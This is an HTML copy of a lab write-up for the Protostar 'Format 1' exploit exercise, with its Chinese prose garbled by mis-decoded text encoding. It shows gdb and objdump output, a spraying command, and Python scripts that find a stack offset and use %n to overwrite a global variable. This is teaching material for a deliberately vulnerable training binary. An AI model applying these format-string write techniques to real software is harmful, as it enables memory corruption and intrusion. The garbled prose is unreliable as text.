<html>
<head>
<title>[ExpDev] Exploit Exercise | Protostar | Format 1</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[ExpDev]æ¼æ´åˆ©ç”¨ç»ƒä¹ |åŸæ’æ˜Ÿ|æ ¼å¼1</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-1-c5182332a69a?source=collection_archive---------1-----------------------#2020-05-27">https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-1-c5182332a69a?source=collection_archive---------1-----------------------#2020-05-27</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/2a432b83c5226c3a04d2aa12d4fdcc01.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Sr48dNDdoxCvweh_.png"/></div></div></figure><h1 id="885a" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">æ ¼å¼1(æ ¼å¼å­—ç¬¦ä¸²åŸºæœ¬1)</h1><p id="9ea9" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">è¿™ä¸ªæŒ‘æˆ˜çš„ç›®æ ‡æ˜¯åˆ©ç”¨æ ¼å¼å­—ç¬¦ä¸²æ¥ä¿®æ”¹ä»»æ„å†…å­˜ä½ç½®ï¼Œä»¥æ‰“å°è·èƒœçš„è¯­å¥ã€‚</p><ul class=""><li id="2d33" class="lx ly it lb b lc lz lg ma lk mb lo mc ls md lw me mf mg mh bi translated">é“¾æ¥:<a class="ae mi" href="https://exploit-exercises.lains.space/protostar/format1/" rel="noopener ugc nofollow" target="_blank">https://exploit-exercises.lains.space/protostar/format1/</a></li></ul><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mj"><img src="../Images/9697c9c14f4a0100e98a3bf9b4b34fc7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*loy5LJXxyYWV86f_wuOyrA.png"/></div></div></figure><h2 id="9834" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">æ³¨æ„äº‹é¡¹</h2><ul class=""><li id="66e6" class="lx ly it lb b lc ld lg lh lk na lo nb ls nc lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">printf(string);</strong></code>:è¿™æ˜¯è¿™æ®µä»£ç ä¸­æ˜“å—æ”»å‡»çš„å‡½æ•°ã€‚<code class="fe nd ne nf ng b">printf()</code>å°†<em class="nh">è€Œä¸æ˜¯</em>æ£€æŸ¥æ‰€æä¾›çš„è¾“å…¥æ˜¯å¦æ˜¯é¢„æœŸçš„æ ¼å¼å­—ç¬¦ä¸²ï¼Œå› ä¸ºå®ƒè¢«ç¼–ç ä¸ºæ¥å—ä»»ä½•å­—ç¬¦ä¸²å€¼ã€‚æ‰€ä»¥æˆ‘ä»¬èƒ½åšçš„åªæ˜¯ç®€å•åœ°éªŒè¯æˆ‘ä»¬æ˜¯å¦å¯ä»¥æ³„æ¼å†…å­˜åœ°å€ï¼Œå¹¶ä¸”ä¹Ÿå¯ä»¥å°†ä»»æ„ä»£ç å†™åˆ°å †æ ˆä¸Š(<strong class="lb iu">ã€è¯»å–ã€‘</strong> <code class="fe nd ne nf ng b">%p</code> â†’ <strong class="lb iu">ã€å†™å…¥ã€‘</strong> <code class="fe nd ne nf ng b">%n</code>)ã€‚</li><li id="2b73" class="lx ly it lb b lc ni lg nj lk nk lo nl ls nm lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">if(target) {</strong></code>:è¿™ä¸ª<code class="fe nd ne nf ng b">target</code>å˜é‡å°±æ˜¯æˆ‘ä»¬éœ€è¦æ‰¾åˆ°çš„ã€‚ç„¶åï¼Œé€šè¿‡åˆ©ç”¨æ ¼å¼å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬å°†æŠŠåœ°å€å†™å…¥å †æ ˆï¼Œé€šè¿‡æŒ‡å®šæ­£ç¡®çš„åç§»å€¼æ¥æ‰“å°å‡ºè·èƒœçš„è¯­å¥ã€‚</li></ul></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h1 id="5c58" class="kb kc it bd kd ke nu kg kh ki nv kk kl km nw ko kp kq nx ks kt ku ny kw kx ky bi translated">æ‹†è§£(GDB)</h1><p id="54f8" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">è®©æˆ‘ä»¬åæ±‡ç¼–äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œçœ‹çœ‹åœ¨ASMçº§åˆ«åšäº†ä»€ä¹ˆ:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="e3d8" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ gdb -q format1</strong><br/>Reading symbols from /opt/protostar/bin/format1...done.<br/><strong class="ng iu">(gdb) set disassembly-flavor intel<br/>(gdb) disassemble vuln</strong></span></pre><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oh"><img src="../Images/4da814aeb1b0680486bc7d3d3d9861ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tOJhV9RTNnz3nEp2WA2PXw.png"/></div></div></figure><p id="2805" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">è¿™ä¸ªç¨‹åºéå¸¸ç®€å•ã€‚æœ‰è¶£çš„æ˜¯ï¼Œ<code class="fe nd ne nf ng b">mov eax,ds:0x8049638</code>å°†ä¸‹é¢çš„åœ°å€ä»<code class="fe nd ne nf ng b">.bss</code>(T8æ®µçš„ä¸€éƒ¨åˆ†)ç§»åˆ°<code class="fe nd ne nf ng b">EAX</code>å¯„å­˜å™¨ä¸­ã€‚</p><p id="31f1" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">ä¸‹é¢æ˜¯ä½¿ç”¨<code class="fe nd ne nf ng b">objdump</code>è½¬å‚¨äºŒè¿›åˆ¶æ–‡ä»¶çš„å¤´:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="30b3" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ objdump -h /opt/protostar/bin/format1</strong><br/>...(snip)...</span><span id="ed5f" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">23 .data</strong>         00000008  <strong class="ng iu">08049628  08049628</strong>  00000628  2**2<br/>                  CONTENTS, ALLOC, LOAD, DATA<br/><strong class="ng iu">24 .bss</strong>          0000000c  <strong class="ng iu">08049630  08049630</strong>  00000630  2**2<br/>                  ALLOC<br/>...(snip)...</span></pre><p id="fa00" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">ç„¶åï¼Œå¦‚æœ<code class="fe nd ne nf ng b">EAX</code>ç­‰äºâ€œ0â€ï¼Œåˆ™<code class="fe nd ne nf ng b">test eax,eax</code>é€šè¿‡å°†<code class="fe nd ne nf ng b">eflags</code>å€¼è®¾ç½®ä¸º<code class="fe nd ne nf ng b">ZF</code>(=é›¶æ ‡å¿—)æ¥åˆ›å»ºæ¡ä»¶è·³è½¬å¦‚æœä¸ºâ€œ0â€ï¼Œåˆ™è·³è½¬ï¼›å¦åˆ™ï¼Œå®ƒç»§ç»­å…¶æ‰§è¡Œæµç¨‹ã€‚</p></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h1 id="1ffe" class="kb kc it bd kd ke nu kg kh ki nv kk kl km nw ko kp kq nx ks kt ku ny kw kx ky bi translated">å‰¥å‰Š</h1><h2 id="8ce5" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">åˆæ­¥ä¾¦å¯Ÿ</h2><p id="acac" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">å¦‚å‰æ‰€è¿°ï¼Œæ˜“å—æ”»å‡»çš„å‡½æ•°æ˜¯<code class="fe nd ne nf ng b">printf(string)</code>ã€‚å½“æˆ‘ä»¬æä¾›ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²æ—¶ï¼Œå®ƒåªæ˜¯å›æ˜¾:</p><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div class="gh gi om"><img src="../Images/f75057f3c1877308497d7e5dcb2d7f97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*945sPZ1QqL_MIiO6rhhnMw.png"/></div></figure><p id="a0e1" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">ç„¶è€Œï¼Œå¦‚æœæˆ‘ä»¬æä¾›ä¸€äº›æ ¼å¼å­—ç¬¦ä¸²å‚æ•°ï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°æœ‰è¶£çš„è¾“å‡ºğŸ˜®ï¼š</p><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div class="gh gi on"><img src="../Images/01c844061062848387f2e0a040ba2648.png" data-original-src="https://miro.medium.com/v2/resize:fit:1230/format:webp/1*1WUWvULE0T_UzDVSBXz3nQ.png"/></div></figure><p id="e4e6" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">è¿™åŸºæœ¬ä¸Šæ˜¯åœ¨å †æ ˆå†…å­˜ä¸­æ‰“å°å‡ºä¸€äº›éšæœºåœ°å€ã€‚ä½†æ›´æœ‰è¶£çš„æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥è¶³å¤Ÿå¤šçš„æ ¼å¼å­—ç¬¦ä¸²å‚æ•°ï¼Œæˆ‘ä»¬å®é™…ä¸Šå¯ä»¥åœ¨å †æ ˆä¸­æ‰¾åˆ°æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ã€‚</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="d3d6" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ ./format1 $(python -c 'print "AAAA" + "%p|" * 156') &amp;&amp; echo</strong></span></pre><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oo"><img src="../Images/29ceea509ebdaf3e90da8ddc02d7818b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1zid95cl4BqEx6_xYoULlA.png"/></div></div></figure><p id="95ba" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">æ»¥ç”¨è¿™ä¸€ç‚¹:(1)æ‰¾åˆ°ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„åç§»é‡â†’ (2)ç¼–å†™ä¸€ä¸ªæˆ‘ä»¬å¸Œæœ›æ‰§è¡Œçš„ä»»æ„ä»£ç ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†åªä¸º<code class="fe nd ne nf ng b">target</code>å˜é‡æä¾›ä¸€ä¸ªåœ°å€æ¥æ‰“å°è·èƒœçš„è¯­å¥ã€‚</p><h2 id="ce1c" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">å¯»æ‰¾åç§»</h2><p id="c280" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">è®©æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªå¿«é€Ÿçš„pythonè„šæœ¬æ¥æŸ¥æ‰¾åç§»å€¼:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="2b2a" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">[exploit.py] - Finding Offset</strong></span><span id="a12f" class="mo kc it ng b gy ol oe l of og">#!/usr/bin/python</span><span id="2341" class="mo kc it ng b gy ol oe l of og">import os</span><span id="52ad" class="mo kc it ng b gy ol oe l of og">egg = "AAAA"</span><span id="4ce2" class="mo kc it ng b gy ol oe l of og">def desc():<br/>  print('[+] Running Simple Format String Spraying...')<br/>  print('[+] Setting Egg: {0}').format(egg.encode("hex"))</span><span id="f151" class="mo kc it ng b gy ol oe l of og">def spraying():<br/>  i = 1<br/>  while i &lt; 200:<br/>    c = int(i)<br/>    p = '/opt/protostar/bin/format1 ' + egg + ("%p" * c) + "%p"<br/>    out = os.popen(p).read()<br/>    s = str(out)<br/>  <br/>    if egg.encode("hex") in s:<br/>      print('[+] Egg found! ...{0}'.format(out[-30:]))<br/>      print('[+] Found Offset: {0}'.format(i))<br/>      break  <br/>    else:<br/>      i += 1<br/>      continue</span><span id="e0f4" class="mo kc it ng b gy ol oe l of og">if __name__ == "__main__":<br/>  desc()<br/>  spraying()</span></pre><p id="a059" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">è¿™ä¸ªè„šæœ¬åº”è¯¥æ˜¯ä¸è¨€è‡ªæ˜çš„ã€‚å½“æˆ‘ä»¬è¿è¡Œè¿™ä¸ªè„šæœ¬æ—¶ï¼Œæˆ‘ä»¬å¾—åˆ°132çš„åç§»é‡ã€‚</p><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div class="gh gi op"><img src="../Images/6d31e4d251f83b9976e68891b7871260.png" data-original-src="https://miro.medium.com/v2/resize:fit:926/format:webp/1*nbeo7NDzFwPVg4xIz0sUmg.png"/></div></figure><h2 id="c6ea" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">å¯»æ‰¾â€œç›®æ ‡â€å˜é‡åœ°å€</h2><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="af25" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ objdump -t format1 |grep target</strong><br/><strong class="ng iu">08049638</strong> g     O .bss <strong class="ng iu">00000004</strong>              target</span></pre><p id="0959" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated"><code class="fe nd ne nf ng b">target</code>çš„åœ°å€å­˜åœ¨äº<code class="fe nd ne nf ng b">0x08049638</code>ä¸­ã€‚å°†åœ°å€è½¬æ¢æˆå°ç«¯æ ¼å¼= <code class="fe nd ne nf ng b">\x38\x96\x04\x08</code>ã€‚</p></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h2 id="4e50" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">æœ€ç»ˆåˆ©ç”¨</h2><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="51c3" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">[exploit.py] - Final Exploit</strong></span><span id="4176" class="mo kc it ng b gy ol oe l of og">#!/usr/bin/python</span><span id="8318" class="mo kc it ng b gy ol oe l of og">import os</span><span id="1b56" class="mo kc it ng b gy ol oe l of og">egg = "\x38\x96\x04\x08"    <strong class="ng iu">&lt;-- Little-endian Formatted "target" </strong></span><span id="d2d3" class="mo kc it ng b gy ol oe l of og">def desc():<br/>  print('[+] Running Simple Format String Spraying...')<br/>  print('[+] Setting Egg: {0}').format(egg.encode("hex"))</span><span id="c03b" class="mo kc it ng b gy ol oe l of og">def spraying():<br/>  i = 1<br/>  while i &lt; 200:<br/>    c = int(i)<br/>    p = '/opt/protostar/bin/format1 ' + egg + ("%p" * c) + "%p"<br/>    out = os.popen(p).read()<br/>    s = str(out)<br/>     <br/>    if egg.encode("hex") in s:<br/>      print('[+] Egg found! ...{0}'.format(out[-30:]))<br/>      print('[+] Found Offset: {0}'.format(i))<br/>      break  <br/>    else:<br/>      i += 1<br/>      continue</span><span id="31e4" class="mo kc it ng b gy ol oe l of og">def win():<br/>  <strong class="ng iu">offset = int(132)    &lt;-- Found Offset Value</strong><br/>  p = '/opt/protostar/bin/format1 ' <br/>  p+= egg <br/>  p+= ("%p" * offset) <br/>  p+= "%n"    <strong class="ng iu">&lt;-- Write the number of char into pointers</strong><br/>  out = os.popen(p).read()<br/>  s = str(out)</span><span id="f621" class="mo kc it ng b gy ol oe l of og">if "target" in s:<br/>    print('[+] Winning Statement: {0}'.format(out[-32:]))<br/>    exit(0) <br/>  else:<br/>    print('[-] Something Went Wrong...')<br/>    exit(1)</span><span id="f9c8" class="mo kc it ng b gy ol oe l of og">if __name__ == "__main__":<br/>  desc()<br/>  #spraying()<br/>  win()</span></pre><p id="5f64" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">å½“æˆ‘ä»¬è¿è¡Œè„šæœ¬æ—¶ï¼Œæˆ‘ä»¬å¾—åˆ°äº†æ¼‚äº®çš„è·èƒœè¯­å¥:</p><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/6539b1e60bdd3f2881991c135c6f23e2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1074/format:webp/1*Ylb3DSfAudSB36TDz2MaVg.png"/></div></figure><p id="a958" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">æ„Ÿè°¢é˜…è¯»ï¼</p><h2 id="da63" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">ä¸‹ä¸€ä¸ªæŒ‘æˆ˜:</h2><ul class=""><li id="3d56" class="lx ly it lb b lc ld lg lh lk na lo nb ls nc lw me mf mg mh bi translated"><a class="ae mi" href="https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-format-2-73ef08011a8c" rel="noopener"> <strong class="lb iu">æ ¼å¼2 </strong> </a> <strong class="lb iu"> </strong> â€”æ ¼å¼å­—ç¬¦ä¸²åˆ©ç”¨:åŸºæœ¬2</li></ul><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi or"><img src="../Images/cf0c368a1f7bafcde7b9cad76701a658.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*DerOnFdlDG7ZbfEb.png"/></div></div></figure></div></div>    
</body>
</html>